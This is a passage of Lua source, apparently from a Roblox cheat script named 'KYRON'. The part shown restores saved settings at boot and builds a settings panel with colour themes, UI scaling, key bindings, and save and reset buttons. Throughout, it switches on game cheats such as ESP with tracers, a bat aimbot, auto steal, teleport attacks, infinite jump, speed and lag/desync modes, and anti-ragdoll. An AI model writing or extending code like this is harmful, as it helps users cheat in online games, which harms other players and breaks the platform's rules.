            _G._KYRONSafeModeSetAction("tpBat", true)
          end

          _G._KYRONTPMirrorEnabled = combatSettings.tpMirror and combatSettings.aimbot

          if handlers["Mirror TP"] then
            handlers["Mirror TP"](combatSettings.tpMirror, true)
          end

          if _G._loadedOn_autoLeft then
            autoPathState.L = true
            pcall(autoPathState.startL)

            if handlers["Auto Left"] then
              handlers["Auto Left"](true, true)
            end
          end

          if _G._loadedOn_autoRight then
            autoPathState.R = true
            pcall(autoPathState.startR)

            if handlers["Auto Right"] then
              handlers["Auto Right"](true, true)
            end
          end

          if _G._loadedOn_autoCarry then
            _G._KYRONAutoCarry = true
            pcall(_G._KYRONStartAutoCarry)

            if handlers["Auto Carry Mode"] then
              handlers["Auto Carry Mode"](true, true)
            end
          end

          if _G._loadedOn_autoCarrySpeed then
            _G._KYRONAutoCarrySpeedEnabled = true
            pcall(_G._KYRONStartAutoCarrySpeed)
            if handlers["Auto Carry Speed"] then
              handlers["Auto Carry Speed"](true, true)
            end
          end

          if _G._loadedOn_autoCarryEnemyBase then
            _G._KYRONAutoCarryEnemyBaseEnabled = true
            pcall(_G._KYRONStartAutoCarryEnemyBase)
            if handlers["Auto Carry on Enemy Base"] then
              handlers["Auto Carry on Enemy Base"](true, true)
            end
          end

          if flag22 then
            print("[Boot] Restoring FOV Change")
            visualSettings.fov = true
            pcall(fn40)

            if handlers["FOV Change"] then
              handlers["FOV Change"](true, true)
            end
          end

          if flag21 then
            print("[Boot] Restoring Stretch Res")
            visualSettings.stretch = true
            pcall(fn38)

            if handlers["Stretch Res"] then
              handlers["Stretch Res"](true, true)
            end
          end

          if antiLag then
            print("[Boot] Restoring Anti-Lag")
            visualSettings.antilag = true
            pcall(_G._KYRONLegacyStartAntiLag)

            if handlers["Anti-Lag"] then
              handlers["Anti-Lag"](true, true)
            else
              print("[Boot] WARN: toggleAPI[Anti-Lag] MISSING")
            end
          end

          if _G._KYRONLoadedOnPotato then
            print("[Boot] Restoring Potato Graphics")
            _G._KYRONPotatoGraphics = true
            pcall(_G._KYRONStartVisualStrip)

            if handlers["Potato Graphics"] then
              handlers["Potato Graphics"](true, true)
            end
          end

          if flag23 then
            print("[Boot] Restoring ESP")

            if _G._KYRONESPSetEnabled then
              pcall(_G._KYRONESPSetEnabled, true)
            end

            if handlers.ESP then
              handlers.ESP(true, true)
            end
          end

          print("[Boot] Restoring Show Tracer", flag24 and "ON" or "OFF")

          if _G._KYRONESPSetShowTracer then
            pcall(_G._KYRONESPSetShowTracer, flag24 and true or false)
          end

          if handlers["Show Tracer"] then
            handlers["Show Tracer"](flag24 and true or false, true)
          end

          if infJump then
            print("[Boot] Restoring Infinite Jump")
            setInfiniteJumpEnabled(true)

            if handlers["Infinite Jump"] then
              handlers["Infinite Jump"](true, true)
            end
          end

          if _G._KYRONLoadedTryHard and _G._KYRONTryHard then
            _G._KYRONTryHard.enabled = true
            pcall(_G._KYRONApplyTryHard)

            if handlers["Try Hard Animation"] then
              handlers["Try Hard Animation"](true, true)
            end
          end

          if _G._loadedOn_autoSwing then
            combatSettings.swing = true

            if handlers["Auto Swing"] then
              handlers["Auto Swing"](true, true)
            end
          end

          if flag19 then
            pcall(fn52)

            if handlers["Bat Counter"] then
              handlers["Bat Counter"](true, true)
            end
          end

          if flag20 then
            flag25 = true
            pcall(_G._KYRONStartMedusaCounter)

            if handlers["Medusa Counter"] then
              handlers["Medusa Counter"](true, true)
            end
          end

          if _G._KYRONLoadedAntiBat and _G._KYRONAntiBat then
            _G._KYRONAntiBat.enabled = true
            pcall(_G._KYRONStartAntiBat)

            if handlers["Anti Bat"] then
              handlers["Anti Bat"](true, true)
            end
          end

          autoStealSettings.AutoSteal = flag18 ~= false
          normalStealSettings.AutoStealEnabled = autoStealSettings.AutoSteal

          if handlers["Auto Steal"] then
            handlers["Auto Steal"](autoStealSettings.AutoSteal, true)
          end

          if autoStealSettings.AutoSteal then
            pcall(syncStealMode)
          end

          task.spawn(function()
            while task.wait(3) do
              if autoStealSettings.AutoSteal then
                if _G._KYRONStealMode == "SEMI" then
                  if stealController.stealConn == nil then
                    pcall(syncStealMode)
                  else
                    pcall(refreshAnimalCache)
                  end
                elseif autoStealRuntime.autoSteal == nil then
                  pcall(syncStealMode)
                end
              end
            end
          end)

          KYRONSyncMobile()
          _G._KYRONSettingsReady = true
          -- Re-apply floating button / steal-bar positions after full boot so they
          -- stick across rejoin and re-execute even if the first pass was early.
          if _G._KYRONApplyMobileButtonPositions then
            pcall(_G._KYRONApplyMobileButtonPositions)
          end
          if _G._KYRONApplyStealBarPosition then
            pcall(_G._KYRONApplyStealBarPosition)
          end
          if _G._KYRONEnsureCoreGuiVisible then
            pcall(_G._KYRONEnsureCoreGuiVisible)
          end
          pcall(_G._KYRONPersistControllerBindings)
          pcall(saveKYRONSettings, true)
        end)

        _G._KYRONMobileBtnScale = _G._KYRONMobileBtnScale or 1

        local function KYRONMobileBtnApplyScale()
          local KYRONMobileBtnScale = _G._KYRONMobileBtnScale or 1

          for _, v95 in ipairs(tbl43) do
            local uiScale2 = v95:FindFirstChildOfClass("UIScale")

            if uiScale2 then
              uiScale2.Scale = KYRONMobileBtnScale
            end
          end
        end

        -- Button scaling and visual-theme updates.
        _G._KYRONMobileBtnApplyScale = KYRONMobileBtnApplyScale
        KYRONMobileBtnApplyScale()

        if Settings then
          local v95 = themePresets
          local n40 = math.clamp(tonumber(_G._KYRONThemeIdx) or 7, 1, #v95)
          local flag30 = _G._KYRONBackgroundColorMatch == true
          local tbl54 = {}

          local function fn90(arg, arg2)
            return math.abs(arg.R - arg2.R) < 0.01 and math.abs(arg.G - arg2.G) < 0.01 and math.abs(arg.B - arg2.B) < 0.01
          end

          local function KYRONApplyImageTheme()
            local accent = flag30 and tbl37.accent or Color3.fromRGB(240, 255, 255)
            local color2 = fn90(tbl37.accent, Color3.fromRGB(240, 255, 255)) and Color3.fromRGB(0, 0, 0) or tbl37.accent
            instance3.ImageColor3 = accent
            instance4.ImageColor3 = _G._KYRONInvertUI and color2 or tbl37.accent
            imageButton.ImageColor3 = _G._KYRONInvertUI and color2 or Color3.fromRGB(255, 255, 255)

            if _G._KYRONBtnImages then
              for _, KYRONBtnImage in ipairs(_G._KYRONBtnImages) do
                if KYRONBtnImage.bg then
                  KYRONBtnImage.bg.ImageColor3 = accent
                end

                if KYRONBtnImage.glow then
                  KYRONBtnImage.glow.ImageColor3 = accent
                end
              end
            end
          end

          _G._KYRONGetButtonImageTint = function()
            return flag30 and tbl37.accent or Color3.fromRGB(255, 240, 240)
          end

          _G._KYRONApplyImageTheme = KYRONApplyImageTheme

          local function fn91()
            for i, v96 in ipairs(tbl54) do
              local flag31 = i == n40

              if v96.button then
                v96.button.BackgroundColor3 = v96.theme.accent
              end

              v96.stroke.Color = _G._KYRONInvertUI and (flag31 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(88, 88, 94)) or flag31 and Color3.fromRGB(255, 255, 240) or Color3.fromRGB(65, 60, 68)
              v96.stroke.Thickness = flag31 and 2 or 1
              v96.stroke.Transparency = flag31 and 0 or 0.35
            end
          end

          local function fn92(KYRONThemeIdx)
            local v96 = v95[KYRONThemeIdx]
            if not v96 then
              return
            end
            local accent = tbl37.accent
            local accentDark = tbl37.accentDark
            local v97 = tbl37
            local accentDark2 = v96.accentDark
            tbl37.accent = v96.accent
            v97.accentDark = accentDark2
            local v98 = _G
            _G._KYRONAccent = v96.accent
            v98._KYRONThemeIdx = KYRONThemeIdx

            if _G._KYRONApplyWorldAccent then
              pcall(_G._KYRONApplyWorldAccent, v96.accent)
            end

            color = _G._KYRONInvertUI and Color3.fromRGB(20, 20, 24) or Color3.fromRGB(255, 255, 240)

            if frame then
              frame.BackgroundColor3 = v96.accent
            end

            if _G._KYRONESPApplyAccent then
              pcall(_G._KYRONESPApplyAccent, v96.accent)
            end

            for _, descendant in ipairs(screenGui:GetDescendants()) do
              if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                if descendant.Text == "KYRON" or descendant.Name == "KYRONTitle" then
                  descendant.TextColor3 = v96.accent
                end
              end
              if not descendant:GetAttribute("_NoKYRONTheme") then
                if descendant:GetAttribute("_KYRONThemed") then
                  if descendant:IsA("TextLabel") or descendant:IsA("TextButton") or descendant:IsA("TextBox") then
                    descendant.TextColor3 = v96.accent
                  elseif descendant:IsA("UIStroke") then
                    descendant.Color = v96.accent
                  elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
                    descendant.ImageColor3 = v96.accent
                  elseif descendant:IsA("Frame") then
                    descendant.BackgroundColor3 = v96.accent
                  end
                elseif not _G._KYRONInvertUI and descendant:IsA("GuiObject") then
                  if fn90(descendant.BackgroundColor3, accent) then
                    descendant.BackgroundColor3 = v96.accent
                  elseif fn90(descendant.BackgroundColor3, accentDark) then
                    descendant.BackgroundColor3 = v96.accentDark
                  end
                elseif not _G._KYRONInvertUI and descendant:IsA("UIStroke") then
                  if fn90(descendant.Color, accent) then
                    descendant.Color = v96.accent
                  elseif fn90(descendant.Color, accentDark) then
                    descendant.Color = v96.accentDark
                  end
                elseif not _G._KYRONInvertUI and (descendant:IsA("ImageLabel") or descendant:IsA("ImageButton")) then
                  if fn90(descendant.ImageColor3, accent) then
                    descendant.ImageColor3 = v96.accent
                  elseif fn90(descendant.ImageColor3, accentDark) then
                    descendant.ImageColor3 = v96.accentDark
                  end
                end
              end
            end

            n40 = KYRONThemeIdx
            KYRONApplyImageTheme()

            if _G._KYRONStealBarMatch and _G._KYRONApplyStealBarBackground then
              pcall(_G._KYRONApplyStealBarBackground)
            end

            fn91()

            if _G._KYRONApplyInvertUI then
              pcall(_G._KYRONApplyInvertUI)
            end
          end

          local function fn93()
            local instance6 = Instance.new("Frame")
            instance6.Name = "ColorThemePicker"
            instance6.BackgroundColor3 = tbl37.row
            instance6.BackgroundTransparency = 0.3
            instance6.BorderSizePixel = 0
            instance6.Size = UDim2.new(1, -4, 0, 30)
            instance6.LayoutOrder = 9002
            instance6.ClipsDescendants = true
            instance6.Parent = Settings
            fn56(instance6, 9)
            fn57(instance6, 1.25)
            local v96 = 5
            local n41 = #v95 * 30 + (#v95 - 1) * v96

            for i, v97 in ipairs(v95) do
              local textButton2 = Instance.new("TextButton")
              textButton2.Name = v97.name
              textButton2.BackgroundColor3 = v97.accent
              textButton2.BorderSizePixel = 0
              textButton2.Size = UDim2.new(0, 30, 0, 12)
              textButton2.Position = UDim2.new(0.5, -n41 / 2 + (i - 1) * (30 + v96), 0.5, -6)
              textButton2.Text = ""
              textButton2:SetAttribute("_NoKYRONTheme", true)
              textButton2.AutoButtonColor = false
              textButton2.Parent = instance6
              fn56(textButton2, 3)
              local uiStroke = Instance.new("UIStroke")
              uiStroke.Parent = textButton2
              tbl54[i] = { stroke = uiStroke, button = textButton2, theme = v97 }

              textButton2.Activated:Connect(function()
                fn92(i)

                if autoSaveSettings.auto then
                  task.spawn(function()
                    pcall(saveKYRONSettings)
                  end)
                end
              end)
            end

            _G._KYRONApplyInvertUI = function()
              local flag31 = _G._KYRONInvertUI == true
              local tbl55 = { frame2 }
              local KYRONSkinGallery = screenGui:FindFirstChild("KYRONSkinGallery")
              local KYRONSongGallery = screenGui:FindFirstChild("KYRONSongGallery")

              if KYRONSkinGallery then
                table.insert(tbl55, KYRONSkinGallery)
              end

              if KYRONSongGallery then
                table.insert(tbl55, KYRONSongGallery)
              end

              _G._KYRONInvertGradientCache = _G._KYRONInvertGradientCache or setmetatable({}, { __mode = "k" })
              local KYRONInvertGradientCache = _G._KYRONInvertGradientCache
              local color2 = fn90(tbl37.accent, Color3.fromRGB(255, 255, 255)) and Color3.fromRGB(0, 0, 0) or tbl37.accent

              for _, v97 in ipairs(tbl55) do
                local tbl56 = { v97 }

                for _, descendant in ipairs(v97:GetDescendants()) do
                  table.insert(tbl56, descendant)
                end

                local albumDisplay = v97:FindFirstChild("AlbumDisplay", true)

                for _, v98 in ipairs(tbl56) do
                  local flag32 = albumDisplay and (v98 == albumDisplay or v98:IsDescendantOf(albumDisplay))

                  if v98:IsA("TextLabel") or v98:IsA("TextButton") or v98:IsA("TextBox") then
                    if flag31 then
                      if v98:GetAttribute("_KYRONInvertOriginalText") == nil then
                        v98:SetAttribute("_KYRONInvertOriginalText", v98.TextColor3)
                      end

                      v98.TextColor3 = Color3.fromRGB(0, 0, 0)
                    elseif v98:GetAttribute("_KYRONInvertOriginalText") ~= nil then
                      v98.TextColor3 = v98:GetAttribute("_KYRONInvertOriginalText")
                      v98:SetAttribute("_KYRONInvertOriginalText", nil)
                    end
                  end

                  if (v98:IsA("Frame") or v98:IsA("TextButton") or v98:IsA("TextBox") or v98:IsA("ScrollingFrame") or v98:IsA("ViewportFrame")) and not flag32 and not v98:GetAttribute("_KYRONNoInvert") then
                    if flag31 and v98.BackgroundTransparency < 1 then
                      if v98:GetAttribute("_KYRONInvertOriginalBg") == nil then
                        v98:SetAttribute("_KYRONInvertOriginalBg", v98.BackgroundColor3)
                        v98:SetAttribute("_KYRONInvertOriginalBgTransparency", v98.BackgroundTransparency)
                      end

                      local flag33 = v98:IsA("Frame") and v98.ZIndex == 4 and v98.BackgroundTransparency >= 0.7
                      local v99 = flag33 and color2
                      local color3

                      if v99 then
                        color3 = v99
                      else
                        color3 = (v98 == frame2 or v98 == KYRONSkinGallery or v98 == KYRONSongGallery) and Color3.fromRGB(252, 248, 250) or Color3.fromRGB(245, 245, 252)
                      end

                      v98.BackgroundColor3 = color3

                      if flag33 then
                        v98.BackgroundTransparency = 0.72
                      end

                      if v98 == frame2 then
                        v98.BackgroundTransparency = 0.1
                      end

                      if v98 == KYRONSkinGallery or v98 == KYRONSongGallery then
                        v98.BackgroundTransparency = 0.04
                      end
                    elseif not flag31 and v98:GetAttribute("_KYRONInvertOriginalBg") ~= nil then
                      v98.BackgroundColor3 = v98:GetAttribute("_KYRONInvertOriginalBg")
                      v98.BackgroundTransparency = v98:GetAttribute("_KYRONInvertOriginalBgTransparency")
                      v98:SetAttribute("_KYRONInvertOriginalBg", nil)
                      v98:SetAttribute("_KYRONInvertOriginalBgTransparency", nil)
                    end
                  end

                  local flag33 = v98:IsA("UIStroke") and not flag32

                  if flag33 then
                    flag33 = not (v98.Parent and v98.Parent:IsA("TextLabel"))
                  end

                  if flag33 then
                    if flag31 then
                      if v98:GetAttribute("_KYRONInvertOriginalStroke") == nil then
                        v98:SetAttribute("_KYRONInvertOriginalStroke", v98.Color)
                        v98:SetAttribute("_KYRONInvertOriginalStrokeTransparency", v98.Transparency)
                        v98:SetAttribute("_KYRONInvertOriginalStrokeThickness", v98.Thickness)
                      end

                      v98.Color = Color3.fromRGB(66, 66, 74)
                      v98.Thickness = math.max(v98.Thickness, 1.25)
                      v98.Transparency = math.min(v98.Transparency, 0.1)
                    elseif v98:GetAttribute("_KYRONInvertOriginalStroke") ~= nil then
                      v98.Color = v98:GetAttribute("_KYRONInvertOriginalStroke")
                      v98.Transparency = v98:GetAttribute("_KYRONInvertOriginalStrokeTransparency")
                      local attribute = v98:GetAttribute("_KYRONInvertOriginalStrokeThickness")

                      if type(attribute) == "number" then
                        v98.Thickness = attribute
                      end

                      v98:SetAttribute("_KYRONInvertOriginalStroke", nil)
                      v98:SetAttribute("_KYRONInvertOriginalStrokeTransparency", nil)
                      v98:SetAttribute("_KYRONInvertOriginalStrokeThickness", nil)
                    end
                  elseif v98:IsA("UIGradient") and not flag32 then
                    if flag31 then
                      if not KYRONInvertGradientCache[v98] then
                        KYRONInvertGradientCache[v98] = { Color = v98.Color, Transparency = v98.Transparency }
                      end

                      if v98.Parent and v98.Parent:IsA("UIStroke") then
                        v98.Color = v80
                        v98.Transparency = v81
                      elseif v98.Parent == KYRONSkinGallery or v98.Parent == KYRONSongGallery then
                        local color3 = Color3.fromRGB
                        v98.Color = ColorSequence.new(Color3.fromRGB(240, 240, 255), color3(224, 224, 230))
                      end
                    elseif KYRONInvertGradientCache[v98] then
                      v98.Color = KYRONInvertGradientCache[v98].Color
                      v98.Transparency = KYRONInvertGradientCache[v98].Transparency
                      KYRONInvertGradientCache[v98] = nil
                    end
                  end
                end
              end

              for _, descendant in ipairs(frame2:GetDescendants()) do
                local v97 = true
                local flag32 = descendant:GetAttribute("_KYRONToggleOn") == v97
                local isFrame = flag31 and descendant:IsA("Frame")
                local flag33

                if isFrame then
                  local v98 = true
                  flag33 = descendant:GetAttribute("_KYRONToggleTrack") == v98
                else
                  flag33 = isFrame
                end

                if flag33 then
                  descendant.BackgroundColor3 = flag32 and color2 or Color3.fromRGB(175, 220, 225)

                  for _, child in ipairs(descendant:GetChildren()) do
                    local isFrame2 = child:IsA("Frame")

                    if isFrame2 then
                      local v98 = true
                      isFrame2 = child:GetAttribute("_KYRONToggleDot") == v98
                    end

                    if isFrame2 then
                      child.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                    end
                  end
                end
              end

              local resetAllSettings = Settings:FindFirstChild("RESET ALL SETTINGS")

              if resetAllSettings and flag31 then
                resetAllSettings.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                resetAllSettings.BackgroundTransparency = 0

                for _, descendant in ipairs(resetAllSettings:GetDescendants()) do
                  if descendant:IsA("TextLabel") or descendant:IsA("TextButton") then
                    descendant.TextColor3 = Color3.fromRGB(255, 255, 240)
                  end
                end
              end

              frame3.BackgroundColor3 = flag31 and Color3.fromRGB(255, 255, 240) or Color3.fromRGB(0, 0, 0)
              imageButton.ImageColor3 = flag31 and color2 or Color3.fromRGB(240, 255, 255)
              instance4.ImageColor3 = flag31 and color2 or tbl37.accent
              fn69()
              fn91()
              KYRONApplyImageTheme()
              pcall(fn74)

              if _G._KYRONRefreshSongGallery then
                pcall(_G._KYRONRefreshSongGallery)
              end

              if _G._KYRONRefreshSkinGallery then
                pcall(_G._KYRONRefreshSkinGallery)
              end

              if _G._KYRONRefreshSpecificButtonHideUI then
                pcall(_G._KYRONRefreshSpecificButtonHideUI)
              end

              if _G._KYRONApplyStealBarInvert then
                pcall(_G._KYRONApplyStealBarInvert)
              end
            end

            fn63(Settings, "Background Color", { toggle = true }).LayoutOrder = 9003

            fn78(Settings, "Background Color", function(KYRONBackgroundColorMatch)
              flag30 = KYRONBackgroundColorMatch
              _G._KYRONBackgroundColorMatch = KYRONBackgroundColorMatch
              KYRONApplyImageTheme()

              if _G._KYRONStealBarMatch and _G._KYRONApplyStealBarBackground then
                pcall(_G._KYRONApplyStealBarBackground)
              end
            end)

            fn92(n40)

            if handlers["Background Color"] then
              handlers["Background Color"](flag30, true)
            end

            KYRONApplyImageTheme()
            fn63(Settings, "Steal Bar Match", { toggle = true }).LayoutOrder = 9004

            fn78(Settings, "Steal Bar Match", function(KYRONStealBarMatch)
              _G._KYRONStealBarMatch = KYRONStealBarMatch

              if _G._KYRONApplyStealBarBackground then
                pcall(_G._KYRONApplyStealBarBackground)
              end
            end)

            if handlers["Steal Bar Match"] then
              handlers["Steal Bar Match"](_G._KYRONStealBarMatch == true, true)
            end

            createTextLabel(Settings, "UI Scale")

            local uiScale2, v97, v98 = fn64(Settings, "UI Scale", KYRONUIScale, 60, 150, 5, function(KYRONUIScale2)
              KYRONUIScale = KYRONUIScale2
              _G._KYRONUIScale = KYRONUIScale2
              fn61()

              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end)

            v86 = v97

            local stealBarSize, v99, v100 = fn64(Settings, "Steal Bar Size", KYRONStealBarScale, 60, 150, 10, function(arg)
              KYRONStealBarScale = arg
              updateStealBarScale()

              task.spawn(function()
                pcall(saveKYRONSettings)
              end)
            end)

            local saveSettings = fn63(Settings, "SAVE SETTINGS", { button = true })
            saveSettings.Size = UDim2.new(1, -4, 0, 42)
            saveSettings.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            saveSettings.BackgroundTransparency = 0
            local textLabel2 = saveSettings:FindFirstChildOfClass("TextLabel")

            if textLabel2 then
              textLabel2.TextColor3 = Color3.fromRGB(255, 240, 240)
              textLabel2.TextSize = 12
            end

            saveSettings.MouseEnter:Connect(function()
              local tbl55 = { BackgroundTransparency = 0.2 }
              TweenService:Create(saveSettings, TweenInfo.new(0.1), tbl55):Play()
            end)

            saveSettings.MouseLeave:Connect(function()
              TweenService:Create(saveSettings, TweenInfo.new(0.1), { BackgroundTransparency = 0 }):Play()
            end)

            fn83(Settings, "SAVE SETTINGS", function()
              -- Mark UI ready so a forced save is never blocked by boot order.
              _G._KYRONSettingsReady = true
              if _G._KYRONConfigLoadReady ~= true then
                _G._KYRONConfigLoadReady = true
              end

              if _G._KYRONCaptureMobileButtonPositions then
                pcall(_G._KYRONCaptureMobileButtonPositions)
              end

              local ok, result = pcall(saveKYRONSettings, true)
              result = ok and result

              if textLabel2 then
                textLabel2.Text = result and "SETTINGS SAVED" or "SAVE FAILED"

                task.delay(1.2, function()
                  if textLabel2 then
                    textLabel2.Text = "SAVE SETTINGS"
                  end
                end)
              end

              if result then
                print("[KYRONSave] Manual SAVE SETTINGS OK - positions + toggles written")
              else
                warn("[KYRONSave] Manual SAVE SETTINGS failed:", tostring(str9))
              end
            end)

            local resetAllSettings = fn63(Settings, "RESET ALL SETTINGS", { button = true })
            resetAllSettings.Size = UDim2.new(1, -4, 0, 42)
            resetAllSettings.BackgroundColor3 = Color3.fromRGB(232, 232, 238)
            resetAllSettings.BackgroundTransparency = 0
            local textLabel3 = resetAllSettings:FindFirstChildOfClass("TextLabel")

            if textLabel3 then
              textLabel3.TextColor3 = Color3.fromRGB(0, 0, 0)
              textLabel3.TextSize = 12
            end

            resetAllSettings.MouseEnter:Connect(function()
              TweenService:Create(resetAllSettings, TweenInfo.new(0.4), { BackgroundTransparency = 0.08 }):Play()
            end)

            resetAllSettings.MouseLeave:Connect(function()
              TweenService:Create(resetAllSettings, TweenInfo.new(0.1), { BackgroundTransparency = 0 }):Play()
            end)

            fn83(Settings, "RESET ALL SETTINGS", function()
              autoSaveSettings.auto = false
              local v101 = movementSpeedSettings
              local v102 = movementSpeedSettings
              local v103 = movementSpeedSettings
              local v104 = movementSpeedSettings
              local v105 = 60
              movementSpeedSettings.NS = 60
              v101.CS = 29
              v102.LG_N = 23
              v103.LG_C = 45
              v104.PL = v105
              local v106 = movementSpeedSettings
              movementSpeedSettings.family = "normal"
              v106.carry = false
              local v107 = normalStealSettings
              local v108 = normalStealSettings
              local v109 = 1.3
              normalStealSettings.StealRadius = 60
              v107.StealDuration = v109
              v108.NormalStealPausePercent = 75
              local cfg = stealController.CFG
              stealController.CFG.STEAL_RANGE = 8.7
              cfg.PRIME_RANGE = 80
              combatSettings.aimSpd = 58
              visualSettings.fovVal = 120
              autoTeleportState.height = 10
              _G._KYRONLookAtEnemyRadius = 24
              dropMode = "JUMP"
              tpMode = "full"
              _G._KYRONInfJumpMode = "HOLD"
              _G._KYRONJumpPower = 55
              _G._KYRONBatMode = "DEFAULT"
              combatSettings.antiMode = false
              _G._KYRONTpBatMode = "HIGH PING"
              _G._KYRONStealMode = "NORMAL"
              _G._KYRONAutoCarryMode = "WHEN NEAR"
              _G._KYRONSkyMode = "Lavender Dream"
              _G._KYRONAnimPack = "Amazon Unboxed"
              pcall(_G._KYRONStartSky, _G._KYRONSkyMode)
              pcall(_G._KYRONApplyAnimPack, _G._KYRONAnimPack)
              _G._KYRONDesyncMode = "V2"
              combatSettings.tpMirror = false
              _G._KYRONTPMirrorEnabled = false
              table.clear(tbl36)
              _G._KYRONAdvancedLaggerButton = true
              _G._KYRONAutoPathMatchSpeed = false

              local function fn94(arg, arg2, arg3)
                local valueBox = fn77(arg, arg2)
                valueBox = valueBox and valueBox:FindFirstChild("ValueBox")

                if valueBox then
                  valueBox.Text = tostring(arg3)
                end
              end

              fn94(Speed, "Normal Speed", movementSpeedSettings.NS)
              fn94(Speed, "Carry Speed", movementSpeedSettings.CS)
              fn94(Speed, "Lagger Normal Speed", movementSpeedSettings.LG_C)
              fn94(Speed, "Lagger Carry Speed", movementSpeedSettings.LG_N)
              fn94(Movement, "Auto TP Height", autoTeleportState.height)
              fn94(Movement, "Bodylock Radius", _G._KYRONLookAtEnemyRadius)
              fn94(Combat, "Radius", normalStealSettings.StealRadius)

              if _G._KYRONSetNormalPauseSelector then
                _G._KYRONSetNormalPauseSelector(normalStealSettings.NormalStealPausePercent, true)
              end

              fn94(Combat, "SEMI Range", stealController.CFG.STEAL_RANGE)
              fn94(Combat, "Auto Bat Speed", combatSettings.aimSpd)
              _G._KYRONTpBatSwingDelay = 0.007
              fn94(Combat, "TP Swing Delay", string.format("%.3f", _G._KYRONTpBatSwingDelay))
              fn94(Utility, "FOV Value", visualSettings.fovVal)

              for _, v110 in ipairs({
                "Auto TP Down",
                "Auto Carry Mode",
                "Bat Aimbot",
                "Auto Swing",
                "Mirror TP",
                "TP Bat",
                "Auto Left",
                "Auto Right",
                "Medusa Counter",
                "Bodylock",
                "Match Speed",
                "Try Hard Animation",
                "Stretch Res",
                "Potato Graphics",
                "Background Color",
                "Steal Bar Match",
                "Neon White Tools",
              }) do
                if handlers[v110] then
                  handlers[v110](false, false)
                end
              end

              for _, v110 in ipairs({
                "Auto Steal",
                "Infinite Jump",
                "Anti Ragdoll",
                "Bat Counter",
                "ESP",
                "Show Tracer",
                "Anti-Lag",
                "FOV Change",
                "Ragdoll Countdown",
                "Ragdoll Steal",
                "Kick Warning",
                "Intro",
                "Advanced Lagger Button",
              }) do
                if handlers[v110] then
                  handlers[v110](true, false)
                end
              end

              if handlers["Safe Mode"] then
                handlers["Safe Mode"](KYRONSafeModeEnabled, false)
              end

              if _G.AutoCounter then
                pcall(_G.AutoCounter.setEnabled, false)
              end

              KYRONBgIdx = 0
              _G._KYRONBgIdx = 0
              fn68()
              fn69()
              flag30 = false
              _G._KYRONBackgroundColorMatch = false
              _G._KYRONStealBarMatch = false

              if _G._KYRONApplyStealBarBackground then
                pcall(_G._KYRONApplyStealBarBackground)
              end

              fn92(7)
              KYRONApplyImageTheme()
              _G._KYRONCircleButtons = false

              if handlers["Circle Buttons"] then
                handlers["Circle Buttons"](false, true)
              end

              if _G._KYRONApplyMobileButtonShape then
                pcall(_G._KYRONApplyMobileButtonShape)
              end

              _G._KYRONFontMode = "DEFAULT"

              if _G._KYRONApplyFontMode then
                pcall(_G._KYRONApplyFontMode)
              end

              _G._KYRONMobileButtonsHidden = false
              _G._KYRONHiddenMobileButtons = {}

              if _G._KYRONApplyMobileButtonsHidden then
                pcall(_G._KYRONApplyMobileButtonsHidden)
              end

              if _G._KYRONRefreshSpecificButtonHideUI then
                pcall(_G._KYRONRefreshSpecificButtonHideUI)
              end

              frame2.Position = udim2
              position = udim2
              _G._KYRONMainPos = nil
              _G._KYRONMobileBtnScale = 1

              if v92 then
                v92(100, true)
              end

              if _G._KYRONMobileBtnApplyScale then
                pcall(_G._KYRONMobileBtnApplyScale)
              end

              _G._KYRONBtnImgIdx = 1
              n34 = 1
              pcall(fn70, 1)
              pcall(fn74)
              local KYRONUIScale2 = KYRONSafeModeEnabled and 65 or 100
              KYRONUIScale = KYRONUIScale2
              _G._KYRONUIScale = KYRONUIScale2
              v98(KYRONUIScale2, true)
              fn61()
              local n42 = KYRONSafeModeEnabled and 70 or 100
              KYRONStealBarScale = n42
              v100(n42, true)
              updateStealBarScale()
              _G._KYRONIntroSongLocked = false
              _G._KYRONIntroSongIndex = KYRONIntroSongIndex
              open.Text = "OPEN"

              if _G._KYRONRefreshSongGallery then
                _G._KYRONRefreshSongGallery()
              end

              _G._KYRONIntroEnabled = true
              _G._KYRONTPMirrorEnabled = false
              _G._KYRONKbSave = {}

              for k, v110 in pairs({
                ["Speed Key"] = "Q",
                ["Lagger Mode Key"] = "R",
                ["Drop Key"] = "X",
                ["TP Down Key"] = "F",
                ["Insta Reset Key"] = "G",
                ["Bat Aimbot Key"] = "E",
                ["TP Bat Key"] = "V",
                ["Auto Left Key"] = "Z",
                ["Auto Right Key"] = "C",
                ["UI Toggle Key"] = "N",
              }) do
                local v111 = fn77(Keybinds, k)
                v111 = v111 and fn86(v111)
                local v112 = Enum.KeyCode[v110]

                if v111 and v112 then
                  v111:SetAttribute("KeyCodeName", v110)
                  v111.Text = v110
                  tbl52[k] = v112
                  _G._KYRONKbSave[k] = v110
                end
              end

              _G._KYRONCtrlSave = {}

              for k in pairs(tbl53) do
                tbl53[k] = nil
              end

              for _, child in ipairs(Controller:GetChildren()) do
                if child:IsA("Frame") and tbl51[child.Name] then
                  local v110 = fn86(child)

                  if v110 then
                    v110:SetAttribute("KeyCodeName", nil)
                    v110.Text = "NONE"
                  end
                end
              end

              if _G._KYRONSelectorAPI then
                local KYRONSelectorAPI = _G._KYRONSelectorAPI

                if KYRONSelectorAPI["Bat Aimbot"] then
                  KYRONSelectorAPI["Bat Aimbot"].set(true, true)
                end

                if KYRONSelectorAPI["Bat Aimbot"] then
                  KYRONSelectorAPI["Bat Aimbot"].set(false, true)
                end

                if KYRONSelectorAPI["Infinite Jump"] then
                  KYRONSelectorAPI["Infinite Jump"].set(false, true)
                end

                if KYRONSelectorAPI["Auto Steal"] then
                  KYRONSelectorAPI["Auto Steal"].set(false, true)
                end

                if KYRONSelectorAPI["Auto Carry Mode"] then
                  KYRONSelectorAPI["Auto Carry Mode"].set(false, true)
                end

                if KYRONSelectorAPI.Font then
                  KYRONSelectorAPI.Font.set(false, true)
                end
              end

              fn82()

              if _G._KYRONRefreshMovementModes then
                _G._KYRONRefreshMovementModes()
              end

              KYRONSyncMobile()
              autoSaveSettings.auto = true

              task.spawn(function()
                pcall(saveKYRONSettings)
              end)

              if textLabel3 then
                textLabel3.Text = "SETTINGS RESET"

                task.delay(1.2, function()
                  if textLabel3 then
                    textLabel3.Text = "RESET ALL SETTINGS"
                  end
                end)
              end
